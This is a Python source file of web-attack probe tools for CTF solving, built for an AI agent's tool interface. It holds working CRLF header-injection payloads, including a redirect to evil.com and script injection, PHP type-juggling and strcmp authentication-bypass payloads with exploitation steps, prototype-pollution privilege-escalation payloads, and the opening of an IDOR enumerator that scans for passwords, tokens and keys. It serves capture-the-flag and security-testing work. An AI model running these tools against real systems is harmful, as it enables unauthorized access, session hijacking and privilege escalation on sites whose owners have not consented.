"""
Miscellaneous probe tools for CTF solving.

Provides utilities for detecting CRLF injection, open redirects,
prototype pollution, IDOR vulnerabilities, and PHP type juggling attacks.
"""

import hashlib
import json
import re
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlencode, quote

import requests


class CrlfProbeTool:
    """
    CrlfProbeTool: detect CRLF / HTTP header injection vulnerabilities.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "url": "http://target.com/redirect",
          "param": "url",
          "method": "GET",
          "data": {},
          "timeout": 10
        }

    The tool injects CRLF payloads into the specified parameter and checks
    whether the injected header appears in the response headers or body.
    """

    name: str = "crlf_probe"
    description: str = (
        "Detect CRLF / HTTP header injection vulnerabilities. Input must be JSON with "
        "'url' (target URL) and 'param' (parameter to inject into). Optionally provide "
        "'method' (GET/POST, default GET), 'data' (extra form data), and 'timeout' "
        "(default 10). Tests various CRLF payloads including basic CRLF, LF-only, "
        "CR-only, response splitting, Unicode CRLF, cookie injection, and redirect "
        "injection. Returns a structured report of vulnerable payloads."
    )

    # CRLF injection payloads: (payload_suffix, description, detection_header, detection_value)
    PAYLOADS: List[Tuple[str, str, str, str]] = [
        (
            "%0d%0aInjected-Header:true",
            "Basic CRLF (%0d%0a)",
            "Injected-Header",
            "true",
        ),
        (
            "%0aInjected-Header:true",
            "LF only (%0a)",
            "Injected-Header",
            "true",
        ),
        (
            "%0dInjected-Header:true",
            "CR only (%0d)",
            "Injected-Header",
            "true",
        ),
        (
            "%0d%0a%0d%0a<script>alert(1)</script>",
            "Response splitting (body injection)",
            None,
            "<script>alert(1)</script>",
        ),
        (
            "%E5%98%8A%E5%98%8DInjected-Header:true",
            "Unicode CRLF (U+560A, U+560D)",
            "Injected-Header",
            "true",
        ),
        (
            "\\r\\nInjected-Header:true",
            "Literal backslash r/n",
            "Injected-Header",
            "true",
        ),
        (
            "%0d%0aSet-Cookie:crlf=injected",
            "Cookie injection via CRLF",
            "Set-Cookie",
            "crlf=injected",
        ),
        (
            "%0d%0aLocation:http://evil.com",
            "Redirect injection via CRLF",
            "Location",
            "http://evil.com",
        ),
    ]

    # Flag patterns
    FLAG_PATTERNS: List[str] = [
        r"(picoCTF\{[^}]+\})",
        r"(HTB\{[^}]+\})",
        r"(THM\{[^}]+\})",
        r"(FLAG\{[^}]+\})",
        r"(flag\{[^}]+\})",
        r"(CTF\{[^}]+\})",
        r"(ctf\{[^}]+\})",
    ]

    def __init__(self, session: Optional[requests.Session] = None) -> None:
        self.session = session or requests.Session()

    def _extract_flag(self, text: str) -> Optional[str]:
        """Try to extract a CTF flag from response text."""
        for pattern in self.FLAG_PATTERNS:
            match = re.search(pattern, text)
            if match:
                return match.group(1)
        return None

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[CrlfProbeTool] Error: Invalid JSON input. {exc}"

        url = data.get("url", "").strip() if isinstance(data.get("url"), str) else ""
        param = data.get("param", "").strip() if isinstance(data.get("param"), str) else ""
        method = (data.get("method") or "GET").upper()
        form_data = data.get("data") or {}
        timeout = data.get("timeout", 10)

        if not url:
            return "[CrlfProbeTool] Error: 'url' is required."
        if not param:
            return "[CrlfProbeTool] Error: 'param' (parameter to inject into) is required."
        if method not in ("GET", "POST"):
            return f"[CrlfProbeTool] Error: 'method' must be GET or POST, got '{method}'."

        # Get baseline response
        baseline_data = {**form_data, param: "baseline_test_value"}
        try:
            if method == "GET":
                baseline_resp = self.session.get(
                    url, params=baseline_data, timeout=timeout, allow_redirects=False
                )
            else:
                baseline_resp = self.session.post(
                    url, data=baseline_data, timeout=timeout, allow_redirects=False
                )
            baseline_status = baseline_resp.status_code
            baseline_length = len(baseline_resp.text)
            baseline_headers = dict(baseline_resp.headers)
        except Exception as exc:
            return f"[CrlfProbeTool] Error getting baseline response: {exc}"

        # Test each payload
        vulnerable_payloads = []
        flags_found = []

        for payload_suffix, description, detect_header, detect_value in self.PAYLOADS:
            injected_value = f"test{payload_suffix}"
            test_data = {**form_data, param: injected_value}

            try:
                if method == "GET":
                    resp = self.session.get(
                        url, params=test_data, timeout=timeout, allow_redirects=False
                    )
                else:
                    resp = self.session.post(
                        url, data=test_data, timeout=timeout, allow_redirects=False
                    )

                is_vulnerable = False
                evidence = []

                # Check if injected header appears in response headers
                if detect_header:
                    for hdr_name, hdr_value in resp.headers.items():
                        if hdr_name.lower() == detect_header.lower():
                            if detect_value.lower() in hdr_value.lower():
                                is_vulnerable = True
                                evidence.append(
                                    f"Header found: {hdr_name}: {hdr_value}"
                                )
                            break

                # Check if CRLF content appears in the response body (response splitting)
                if detect_value and detect_value in resp.text:
                    is_vulnerable = True
                    evidence.append(
                        f"Payload content found in response body"
                    )

                # Check for new headers not in baseline
                for hdr_name in resp.headers:
                    if hdr_name.lower() not in [h.lower() for h in baseline_headers]:
                        if hdr_name.lower() in ("injected-header",):
                            is_vulnerable = True
                            evidence.append(
                                f"New header appeared: {hdr_name}: {resp.headers[hdr_name]}"
                            )

                # Check for flags
                flag = self._extract_flag(resp.text)
                if flag:
                    flags_found.append(flag)
                    evidence.append(f"FLAG FOUND: {flag}")

                if is_vulnerable:
                    vulnerable_payloads.append({
                        "description": description,
                        "payload": injected_value,
                        "status": resp.status_code,
                        "evidence": evidence,
                    })

            except requests.exceptions.Timeout:
                pass
            except Exception:
                pass

        # Build output report
        output_lines = [
            f"[CrlfProbeTool] CRLF / Header Injection Probe Results",
            "=" * 55,
            f"Target: {url}",
            f"Method: {method}",
            f"Parameter: {param}",
            f"Payloads Tested: {len(self.PAYLOADS)}",
            f"Baseline Status: {baseline_status}",
            f"Baseline Length: {baseline_length} bytes",
            "",
        ]

        if flags_found:
            output_lines.append("!!! FLAGS FOUND !!!")
            for flag in flags_found:
                output_lines.append(f"  {flag}")
            output_lines.append("")

        if vulnerable_payloads:
            output_lines.append(f"VULNERABLE PAYLOADS ({len(vulnerable_payloads)} found):")
            output_lines.append("-" * 40)
            for item in vulnerable_payloads:
                output_lines.append(f"  [{item['description']}]")
                output_lines.append(f"    Payload: {item['payload']}")
                output_lines.append(f"    Status: {item['status']}")
                for ev in item["evidence"]:
                    output_lines.append(f"    -> {ev}")
                output_lines.append("")
        else:
            output_lines.append("No CRLF injection vulnerabilities detected.")
            output_lines.append("")

        # Exploitation suggestions
        output_lines.append("RECOMMENDATIONS:")
        if vulnerable_payloads:
            output_lines.append("  [!] CRLF injection confirmed!")
            output_lines.append("  - Try injecting Set-Cookie headers to set arbitrary cookies")
            output_lines.append("  - Try injecting Location headers for open redirect")
            output_lines.append("  - Try response splitting: inject a full HTTP response body")
            output_lines.append("  - Try injecting X-Forwarded-For or other trust headers")
            output_lines.append("  - Combine with XSS via response body injection")
        else:
            output_lines.append("  - No CRLF injection detected with standard payloads.")
            output_lines.append("  - Try double-encoding (%250d%250a) or other bypass techniques.")
            output_lines.append("  - Check if the parameter value is reflected in response headers.")

        return "\n".join(output_lines)


class PhpTypeJugglingTool:
    """
    PhpTypeJugglingTool: generate PHP type juggling payloads and reference data.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "operation": "magic_hashes",
          "hash_type": "md5",
          "target_value": "0"
        }

    Supported operations:
      - magic_hashes: Known values whose hash starts with 0e (scientific notation trick)
      - strcmp_bypass: Payloads to bypass strcmp() checks
      - loose_comparison: PHP loose comparison table and gotchas
      - type_coercion: Payloads for intval(), is_numeric(), in_array() bypass
    """

    name: str = "php_type_juggling"
    description: str = (
        "Generate PHP type juggling attack payloads and reference data. Input must be "
        "JSON with 'operation' (magic_hashes, strcmp_bypass, loose_comparison, or "
        "type_coercion). For magic_hashes, optionally provide 'hash_type' (md5/sha1/sha256, "
        "default md5). Returns known magic hash values, bypass payloads, comparison "
        "tables, and exploitation guidance for PHP loose type comparison vulnerabilities."
    )

    VALID_OPERATIONS = ("magic_hashes", "strcmp_bypass", "loose_comparison", "type_coercion")

    # Magic hashes: values whose hash starts with 0e followed by only digits
    MAGIC_HASHES_MD5: List[Tuple[str, str]] = [
        ("240610708", "0e462097431906509019562988736854"),
        ("QNKCDZO", "0e830400451993494058024219903391"),
        ("aabg7XSs", "0e087386482136013740957780965295"),
        ("aabC9RqS", "0e041022518165728065344349536617"),
        ("s878926199a", "0e545993274517709034328855841020"),
        ("s155964671a", "0e342768416822451524974117254469"),
        ("s214587387a", "0e848240448830537924465865611904"),
        ("0e215962017", "0e291242476940776845150308577824"),
    ]

    MAGIC_HASHES_SHA1: List[Tuple[str, str]] = [
        ("aaroZmOk", "0e00000000000000000000000000000000000000"),
        ("aaK1STfY", "0e76658526655756207688271159624026011393"),
        ("aaO8zKZF", "0e57855384913097576052441895780700925679"),
        ("10932435112", "0e07766915004133176347055865026311692244"),
    ]

    def __init__(self) -> None:
        pass

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[PhpTypeJugglingTool] Error: Invalid JSON input. {exc}"

        operation = data.get("operation", "").strip().lower()
        if not operation:
            return (
                "[PhpTypeJugglingTool] Error: 'operation' is required. "
                "Must be one of: magic_hashes, strcmp_bypass, loose_comparison, type_coercion."
            )

        if operation not in self.VALID_OPERATIONS:
            return (
                f"[PhpTypeJugglingTool] Error: Invalid operation '{operation}'. "
                f"Must be one of: {', '.join(self.VALID_OPERATIONS)}."
            )

        if operation == "magic_hashes":
            return self._magic_hashes(data)
        elif operation == "strcmp_bypass":
            return self._strcmp_bypass(data)
        elif operation == "loose_comparison":
            return self._loose_comparison(data)
        elif operation == "type_coercion":
            return self._type_coercion(data)

        return "[PhpTypeJugglingTool] Error: Unexpected state."

    def _magic_hashes(self, data: dict) -> str:
        """Return known magic hash values."""
        hash_type = data.get("hash_type", "md5").strip().lower()
        target_value = data.get("target_value", "0")

        lines = [
            "[PhpTypeJugglingTool] Magic Hash Values",
            "=" * 55,
            "",
            "PHP loose comparison (==) treats strings starting with '0e'",
            "followed by only digits as scientific notation (0 * 10^N = 0).",
            f"So any 0e-hash == {target_value!r} evaluates to TRUE with ==.",
            "",
        ]

        if hash_type in ("md5", "all"):
            lines.append("=== MD5 Magic Hashes ===")
            lines.append(f"{'Value':<20} {'MD5 Hash'}")
            lines.append("-" * 55)
            for value, md5_hash in self.MAGIC_HASHES_MD5:
                lines.append(f"{value:<20} {md5_hash}")
            lines.append("")

        if hash_type in ("sha1", "all"):
            lines.append("=== SHA1 Magic Hashes ===")
            lines.append(f"{'Value':<20} {'SHA1 Hash'}")
            lines.append("-" * 55)
            for value, sha1_hash in self.MAGIC_HASHES_SHA1:
                lines.append(f"{value:<20} {sha1_hash}")
            lines.append("")

        if hash_type == "sha256":
            lines.append("=== SHA256 Magic Hashes ===")
            lines.append("No practical 0e magic hashes are known for SHA256.")
            lines.append("The probability of finding one is extremely low due to")
            lines.append("the 64-character hash length requiring all digits after '0e'.")
            lines.append("")

        if hash_type not in ("md5", "sha1", "sha256", "all"):
            lines.append(f"Unknown hash type '{hash_type}'. Supported: md5, sha1, sha256, all.")
            lines.append("")

        lines.append("=== Usage ===")
        lines.append("If the server does: if (md5($input) == '0') or if (md5($a) == md5($b))")
        lines.append("Send any magic hash value as input to bypass the check.")
        lines.append("")
        lines.append("Example: password=240610708 bypasses md5($password) == '0'")
        lines.append("Example: Both 240610708 and QNKCDZO have 0e hashes, so")
        lines.append("         md5('240610708') == md5('QNKCDZO') is TRUE in PHP.")

        return "\n".join(lines)

    def _strcmp_bypass(self, data: dict) -> str:
        """Generate payloads to bypass strcmp()."""
        lines = [
            "[PhpTypeJugglingTool] strcmp() Bypass Payloads",
            "=" * 55,
            "",
            "PHP strcmp() returns NULL when comparing a string with an array.",
            "In loose comparison: NULL == 0 is TRUE, so strcmp() == 0 passes.",
            "Note: This works in PHP < 8.0. PHP 8.0+ throws a TypeError.",
            "",
            "=== URL-encoded Payloads (GET/POST) ===",
            "",
            "  password[]=                     # sends array instead of string",
            "  password[]=anything             # array with value",
            "  password[0]=                    # explicit index",
            "",
            "=== JSON Payloads ===",
            "",
            '  {"password": []}               # empty array',
            '  {"password": [""]}             # array with empty string',
            '  {"password": true}             # boolean true',
            '  {"password": 0}                # integer zero',
            "",
            "=== Raw POST Body ===",
            "",
            "  password[]=&username=admin      # form-encoded array",
            "",
            "=== Exploitation Steps ===",
            "",
            "1. Identify a login form or API that uses strcmp() for password check",
            "2. Change the password parameter from a string to an array:",
            "   - Change password=test to password[]=",
            "3. If the server uses JSON, send an array or non-string type",
            "4. If using PHP < 8.0, strcmp(array, string) returns NULL",
            "5. NULL == 0 is TRUE in loose comparison, bypassing the check",
            "",
            "=== PHP Version Notes ===",
            "",
            "  PHP 5.x-7.x: strcmp([], 'secret') returns NULL; NULL == 0 is TRUE",
            "  PHP 8.0+:    strcmp([], 'secret') throws TypeError (not exploitable)",
        ]

        return "\n".join(lines)

    def _loose_comparison(self, data: dict) -> str:
        """Show PHP loose comparison table and gotchas."""
        lines = [
            "[PhpTypeJugglingTool] PHP Loose Comparison (==) Gotchas",
            "=" * 55,
            "",
            "PHP loose comparison (==) performs type juggling before comparison.",
            "This leads to many unexpected TRUE results that can be exploited.",
            "",
            "=== Key Loose Comparisons ===",
            "",
            '  "0" == false        => TRUE',
            '  "" == false         => TRUE',
            '  "" == 0             => TRUE  (PHP 7), FALSE (PHP 8)',
            '  "0" == null         => FALSE (PHP 8), TRUE (PHP 7)',
            '  "php" == 0          => TRUE  (PHP 7), FALSE (PHP 8)',
            '  "1" == "01"         => TRUE',
            '  "10" == "1e1"       => TRUE  (scientific notation)',
            '  "100" == "1E2"      => TRUE  (scientific notation)',
            '  "0e123" == "0e456"  => TRUE  (both are 0 in scientific notation)',
            '  "0" == "0e999"      => TRUE  (0 == 0)',
            '  null == false       => TRUE',
            '  "" == null          => TRUE',
            '  0 == "any_string"   => TRUE  (PHP 7), FALSE (PHP 8)',
            '  true == "any_string" => TRUE (non-empty string)',
            '  true == 1           => TRUE',
            '  true == -1          => TRUE',
            "",
            "=== Authentication Bypass Techniques ===",
            "",
            "1. Magic hashes: If server checks md5(input) == '0' or md5(a) == md5(b)",
            "   Send a value whose MD5 starts with 0e (e.g., 240610708)",
            "",
            "2. Boolean bypass: If server checks password == stored_hash",
            '   Send true (in JSON: {"password": true}) since true == "any_string"',
            "",
            "3. Integer bypass: If server checks password == '0'",
            "   Send 0 (integer) since 0 == '0' is TRUE",
            "",
            "4. Scientific notation: If comparing numeric strings",
            '   "1e1" == "10" and "0e1" == "0" both evaluate TRUE',
            "",
            "=== Strict vs Loose ===",
            "",
            "  ==  (loose):  type juggling, many unexpected TRUE values",
            "  === (strict): no type juggling, compares type AND value",
            "",
            "  Always check if the target uses == or ===.",
            "  Loose comparison is far more exploitable.",
        ]

        return "\n".join(lines)

    def _type_coercion(self, data: dict) -> str:
        """Generate payloads for intval(), is_numeric(), in_array() bypass."""
        lines = [
            "[PhpTypeJugglingTool] Type Coercion Bypass Payloads",
            "=" * 55,
            "",
            "=== intval() Bypass ===",
            "",
            "intval() converts strings to integers, stopping at first non-digit.",
            "",
            '  intval("0x1A") = 0           # PHP 7 (hex not parsed)',
            '  intval("0x1A", 16) = 26      # explicit base 16',
            '  intval("123abc") = 123       # stops at "a"',
            '  intval("0123") = 123         # leading zero stripped (decimal)',
            '  intval("1e2") = 1            # PHP 7 (not scientific)',
            '  intval("1e2") = 100          # PHP 8 (scientific parsed)',
            "",
            "  Bypass: if intval($input) == 0 is the check,",
            '    send "0abc" (intval returns 0) but string comparison passes',
            "",
            "=== is_numeric() Bypass ===",
            "",
            "is_numeric() returns true for numeric strings including hex (PHP 5) and",
            "scientific notation.",
            "",
            '  is_numeric("0x539") = true    # PHP 5 only (hex string)',
            '  is_numeric("0x539") = false   # PHP 7+ (hex not numeric)',
            '  is_numeric("1e2") = true      # scientific notation',
            '  is_numeric("0123") = true     # octal-looking but decimal',
            '  is_numeric(" 123") = true     # leading whitespace OK',
            '  is_numeric("123\\n") = true   # trailing whitespace OK',
            "",
            "  Bypass: Send scientific notation or whitespace-padded numbers",
            "  to pass is_numeric() but get different intval() results",
            "",
            "=== in_array() Bypass (Loose Comparison) ===",
            "",
            "By default, in_array() uses loose comparison (no strict flag).",
            "",
            '  in_array("1abc", [0, 1, 2]) = true    # "1abc" == 1 (PHP 7)',
            '  in_array("0abc", [0, 1, 2]) = true    # "0abc" == 0 (PHP 7)',
            '  in_array(true, ["a", "b"]) = true      # true == "a"',
            '  in_array(0, ["a", "b"]) = true         # 0 == "a" (PHP 7)',
            "",
            "  Bypass: if checking user role against allowed list,",
            '  send 0 or true to match any string in the array',
            "",
            "=== json_decode() Type Confusion ===",
            "",
            "When a PHP application uses json_decode() and compares with ==:",
            "",
            '  JSON integer 0 vs PHP string "password": 0 == "password" is TRUE (PHP 7)',
            '  JSON true vs PHP string "anything": true == "anything" is TRUE',
            '  JSON string "0" vs PHP integer 0: "0" == 0 is TRUE',
            "",
            "  Bypass: Send JSON with integer/boolean types instead of strings",
            '  Example: {"password": 0} or {"password": true}',
            "",
            "=== PHP Version Impact ===",
            "",
            "  PHP 7.x: Many type juggling attacks work (string-to-int coercion)",
            '  PHP 8.0+: "0 == \'string\'" now returns FALSE (breaking change)',
            "  PHP 8.0+: strcmp() with non-strings throws TypeError",
            "  PHP 8.1+: More strict type handling in built-in functions",
        ]

        return "\n".join(lines)


class PrototypePollutionTool:
    """
    PrototypePollutionTool: test for prototype pollution vulnerabilities.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "url": "http://target.com/api/merge",
          "method": "POST",
          "param": null,
          "body": null,
          "content_type": "application/json",
          "timeout": 10
        }

    Tests for JavaScript prototype pollution and Python class pollution by
    sending payloads that attempt to set properties on Object.prototype.
    """

    name: str = "prototype_pollution_probe"
    description: str = (
        "Test for prototype pollution vulnerabilities (JavaScript and Python). "
        "Input must be JSON with 'url' (target endpoint). Optionally provide 'method' "
        "(default POST), 'param' (for query/form injection), 'body' (JSON body template), "
        "'content_type' (default application/json), and 'timeout' (default 10). "
        "Tests __proto__, constructor.prototype, and Python class pollution payloads, "
        "then compares responses to detect successful pollution."
    )

    # JSON body pollution payloads: (payload_dict, description)
    JSON_PAYLOADS: List[Tuple[dict, str]] = [
        (
            {"__proto__": {"polluted": "true"}},
            "Basic __proto__ pollution",
        ),
        (
            {"constructor": {"prototype": {"polluted": "true"}}},
            "constructor.prototype pollution",
        ),
        (
            {"__proto__": {"isAdmin": True}},
            "__proto__ privilege escalation (isAdmin)",
        ),
        (
            {"__proto__": {"role": "admin"}},
            "__proto__ role injection",
        ),
        (
            {"__proto__": {"status": 200}},
            "__proto__ status override",
        ),
    ]

    # Query parameter pollution payloads: (param_string, description)
    QUERY_PAYLOADS: List[Tuple[str, str]] = [
        ("__proto__[polluted]=true", "Query param __proto__[polluted]"),
        ("__proto__.polluted=true", "Query param __proto__.polluted"),
        ("constructor[prototype][polluted]=true", "Query param constructor.prototype"),
    ]

    # Python class pollution payloads: (payload_dict, description)
    PYTHON_PAYLOADS: List[Tuple[dict, str]] = [
        (
            {"__class__": {"__qualname__": "test"}},
            "Python class attribute override",
        ),
        (
            {"__init__": {"__globals__": {"flag": "test"}}},
            "Python globals access via __init__",
        ),
    ]

    # Error patterns that suggest prototype pollution handling
    POLLUTION_ERROR_PATTERNS: List[str] = [
        r"__proto__",
        r"prototype",
        r"Object\.assign",
        r"merge",
        r"extend",
        r"lodash",
        r"deepmerge",
        r"deep[\-_]?copy",
    ]

    def __init__(self, session: Optional[requests.Session] = None) -> None:
        self.session = session or requests.Session()

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[PrototypePollutionTool] Error: Invalid JSON input. {exc}"

        url = data.get("url", "").strip() if isinstance(data.get("url"), str) else ""
        method = (data.get("method") or "POST").upper()
        param = data.get("param")
        body_template = data.get("body")
        content_type = data.get("content_type", "application/json")
        timeout = data.get("timeout", 10)

        if not url:
            return "[PrototypePollutionTool] Error: 'url' is required."
        if method not in ("GET", "POST", "PUT", "PATCH"):
            return f"[PrototypePollutionTool] Error: 'method' must be GET, POST, PUT, or PATCH, got '{method}'."

        # Get baseline response
        try:
            if "json" in content_type.lower():
                baseline_body = body_template if body_template else {"test": "baseline"}
                baseline_resp = self.session.request(
                    method, url, json=baseline_body,
                    headers={"Content-Type": content_type}, timeout=timeout,
                )
            else:
                baseline_resp = self.session.request(
                    method, url, data=body_template or {"test": "baseline"},
                    timeout=timeout,
                )
            baseline_status = baseline_resp.status_code
            baseline_length = len(baseline_resp.text)
            baseline_body_text = baseline_resp.text
        except Exception as exc:
            return f"[PrototypePollutionTool] Error getting baseline response: {exc}"

        findings = []
        error_indicators = []

        # Test JSON body payloads
        if "json" in content_type.lower():
            for payload_dict, description in self.JSON_PAYLOADS:
                # Merge payload with body template if provided
                if body_template and isinstance(body_template, dict):
                    merged = {**body_template, **payload_dict}
                else:
                    merged = payload_dict

                try:
                    resp = self.session.request(
                        method, url, json=merged,
                        headers={"Content-Type": content_type}, timeout=timeout,
                    )

                    changes = self._detect_changes(
                        baseline_status, baseline_length, baseline_body_text,
                        resp.status_code, len(resp.text), resp.text
                    )
                    error_msgs = self._check_error_patterns(resp.text)

                    if changes or error_msgs:
                        finding = {
                            "type": "json_body",
                            "description": description,
                            "payload": json.dumps(payload_dict),
                            "status": resp.status_code,
                            "changes": changes,
                            "errors": error_msgs,
                        }
                        findings.append(finding)

                    if error_msgs:
                        error_indicators.extend(error_msgs)

                except Exception:
                    pass

            # Test Python class pollution payloads
            for payload_dict, description in self.PYTHON_PAYLOADS:
                if body_template and isinstance(body_template, dict):
                    merged = {**body_template, **payload_dict}
                else:
                    merged = payload_dict

                try:
                    resp = self.session.request(
                        method, url, json=merged,
                        headers={"Content-Type": content_type}, timeout=timeout,
                    )

                    changes = self._detect_changes(
                        baseline_status, baseline_length, baseline_body_text,
                        resp.status_code, len(resp.text), resp.text
                    )
                    error_msgs = self._check_error_patterns(resp.text)

                    if changes or error_msgs:
                        finding = {
                            "type": "python_class",
                            "description": description,
                            "payload": json.dumps(payload_dict),
                            "status": resp.status_code,
                            "changes": changes,
                            "errors": error_msgs,
                        }
                        findings.append(finding)

                except Exception:
                    pass

        # Test query parameter payloads
        if param or method == "GET":
            for query_string, description in self.QUERY_PAYLOADS:
                try:
                    test_url = f"{url}{'&' if '?' in url else '?'}{query_string}"
                    resp = self.session.request(method, test_url, timeout=timeout)

                    changes = self._detect_changes(
                        baseline_status, baseline_length, baseline_body_text,
                        resp.status_code, len(resp.text), resp.text
                    )
                    error_msgs = self._check_error_patterns(resp.text)

                    if changes or error_msgs:
                        finding = {
                            "type": "query_param",
                            "description": description,
                            "payload": query_string,
                            "status": resp.status_code,
                            "changes": changes,
                            "errors": error_msgs,
                        }
                        findings.append(finding)

                except Exception:
                    pass

        # Build output report
        output_lines = [
            "[PrototypePollutionTool] Prototype Pollution Probe Results",
            "=" * 58,
            f"Target: {url}",
            f"Method: {method}",
            f"Content-Type: {content_type}",
            f"Baseline Status: {baseline_status}",
            f"Baseline Length: {baseline_length} bytes",
            "",
        ]

        if findings:
            output_lines.append(f"POTENTIAL FINDINGS ({len(findings)}):")
            output_lines.append("-" * 40)
            for finding in findings:
                output_lines.append(f"  [{finding['type'].upper()}] {finding['description']}")
                output_lines.append(f"    Payload: {finding['payload']}")
                output_lines.append(f"    Status: {finding['status']}")
                if finding["changes"]:
                    for change in finding["changes"]:
                        output_lines.append(f"    -> {change}")
                if finding["errors"]:
                    for err in finding["errors"]:
                        output_lines.append(f"    -> Error indicator: {err}")
                output_lines.append("")
        else:
            output_lines.append("No prototype pollution indicators detected.")
            output_lines.append("")

        # Summary and exploitation suggestions
        output_lines.append("RECOMMENDATIONS:")
        if findings:
            output_lines.append("  [!] Potential prototype pollution detected!")
            output_lines.append("  - Try __proto__.isAdmin = true for privilege escalation")
            output_lines.append("  - Try __proto__.role = 'admin' for role injection")
            output_lines.append("  - Try __proto__.constructor to modify object behavior")
            output_lines.append("  - Check if server uses lodash.merge(), Object.assign(), or similar")
            output_lines.append("  - For Python: try __class__.__init__.__globals__ traversal")
        else:
            output_lines.append("  - No pollution detected with standard payloads.")
            output_lines.append("  - Try nested JSON: {\"a\": {\"__proto__\": {\"b\": 1}}}")
            output_lines.append("  - Try different content types or request methods.")
            output_lines.append("  - Check if the application uses deep merge libraries.")

        return "\n".join(output_lines)

    def _detect_changes(
        self,
        baseline_status: int,
        baseline_length: int,
        baseline_body: str,
        resp_status: int,
        resp_length: int,
        resp_body: str,
    ) -> List[str]:
        """Detect differences between baseline and test response."""
        changes = []

        if resp_status != baseline_status:
            changes.append(f"Status changed: {baseline_status} -> {resp_status}")

        length_diff = abs(resp_length - baseline_length)
        if length_diff > 50:
            changes.append(f"Length changed: {baseline_length} -> {resp_length} (diff: {length_diff})")

        if resp_body != baseline_body and not changes:
            # Body changed but length similar - content difference
            if resp_body[:200] != baseline_body[:200]:
                changes.append("Response body content changed")

        return changes

    def _check_error_patterns(self, text: str) -> List[str]:
        """Check response for prototype pollution related error messages."""
        found = []
        for pattern in self.POLLUTION_ERROR_PATTERNS:
            if re.search(pattern, text, re.IGNORECASE):
                found.append(pattern)
        return found


class IdorEnumeratorTool:
    """
    IdorEnumeratorTool: enumerate resources to detect IDOR vulnerabilities.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "url": "http://target.com/api/user/1",
          "param": "1",
          "param_type": "path",
          "param_name": "id",
          "range_start": 0,
          "range_end": 20,
          "id_type": "sequential",
          "method": "GET",
          "headers": {},
          "data": {},
          "timeout": 10
        }

    Enumerates IDs in the specified range and detects anomalies indicating
    Insecure Direct Object Reference vulnerabilities.
    """

    name: str = "idor_enumerator"
    description: str = (
        "Enumerate resources to detect IDOR (Insecure Direct Object Reference) "
        "vulnerabilities. Input must be JSON with 'url' (URL containing the ID) and "
        "'param' (current ID value in URL or parameter). Optionally provide 'param_type' "
        "(path/query/body, default path), 'param_name' (for query/body), 'range_start' "
        "(default 0), 'range_end' (default 20), 'id_type' (sequential/md5, default "
        "sequential), 'method' (default GET), 'headers', 'data', 'timeout' (default 10). "
        "Returns enumeration results with anomaly detection. Range capped at 100 IDs."
    )

    # Flag patterns
    FLAG_PATTERNS: List[str] = [
        r"(picoCTF\{[^}]+\})",
        r"(HTB\{[^}]+\})",
        r"(THM\{[^}]+\})",
        r"(FLAG\{[^}]+\})",
        r"(flag\{[^}]+\})",
        r"(CTF\{[^}]+\})",
        r"(ctf\{[^}]+\})",
    ]

    # Interesting content patterns
    INTERESTING_PATTERNS: List[Tuple[str, str]] = [
        (r"admin", "Contains 'admin'"),
        (r"password", "Contains 'password'"),
        (r"secret", "Contains 'secret'"),
        (r"token", "Contains 'token'"),
        (r"api[_-]?key", "Contains API key reference"),
        (r"private", "Contains 'private'"),
        (r"root", "Contains 'root'"),
        (r"flag", "Contains 'flag'"),
    ]

    MAX_RANGE = 100

    def __init__(self, session: Optional[requests.Session] = None) -> None:
        self.session = session or requests.Session()

    def _extract_flag(self, text: str) -> Optional[str]:
        """Try to extract a CTF flag from response text."""
        for pattern in self.FLAG_PATTERNS:
            match = re.search(pattern, text)
            if match:
                return match.group(1)
        return None

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[IdorEnumeratorTool] Error: Invalid JSON input. {exc}"

        url = data.get("url", "").strip() if isinstance(data.get("url"), str) else ""
        param = str(data.get("param", "")).strip()
        param_type = data.get("param_type", "path").strip().lower()
        param_name = data.get("param_name", "id").strip()
        range_start = data.get("range_start", 0)
        range_end = data.get("range_end", 20)
        id_type = data.get("id_type", "sequential").strip().lower()
        method = (data.get("method") or "GET").upper()
        headers = data.get("headers") or {}
        form_data = data.get("data") or {}
        timeout = data.get("timeout", 10)

        if not url:
            return "[IdorEnumeratorTool] Error: 'url' is required."
        if not param:
            return "[IdorEnumeratorTool] Error: 'param' (current ID value) is required."
        if param_type not in ("path", "query", "body"):
            return f"[IdorEnumeratorTool] Error: 'param_type' must be path, query, or body, got '{param_type}'."
        if id_type not in ("sequential", "md5"):
            return f"[IdorEnumeratorTool] Error: 'id_type' must be sequential or md5, got '{id_type}'."
        if method not in ("GET", "POST"):
            return f"[IdorEnumeratorTool] Error: 'method' must be GET or POST, got '{method}'."

        # Cap range at MAX_RANGE
        if range_end - range_start > self.MAX_RANGE:
            range_end = range_start + self.MAX_RANGE

        # Generate ID values
        id_values = []
        for i in range(range_start, range_end + 1):
            if id_type == "sequential":
                id_values.append(str(i))
            elif id_type == "md5":
                id_values.append(hashlib.md5(str(i).encode()).hexdigest())

        # Enumerate IDs
        results_table = []
        flags_found = []
        interesting_findings = []
        response_lengths = []

        for id_value in id_values:
            try:
                resp = self._make_request(
                    url, method, param, param_type, param_name,
                    id_value, headers, form_data, timeout,
                )

                resp_text = resp.text
                resp_status = resp.status_code
                resp_length = len(resp_text)
                preview = resp_text[:150].replace("\n", " ").replace("\r", "")

                results_table.append({
                    "id": id_value if id_type == "sequential" else f"{id_value[:8]}... (md5 of {id_values.index(id_value) + range_start})",
                    "status": resp_status,
                    "length": resp_length,
                    "preview": preview,
                })
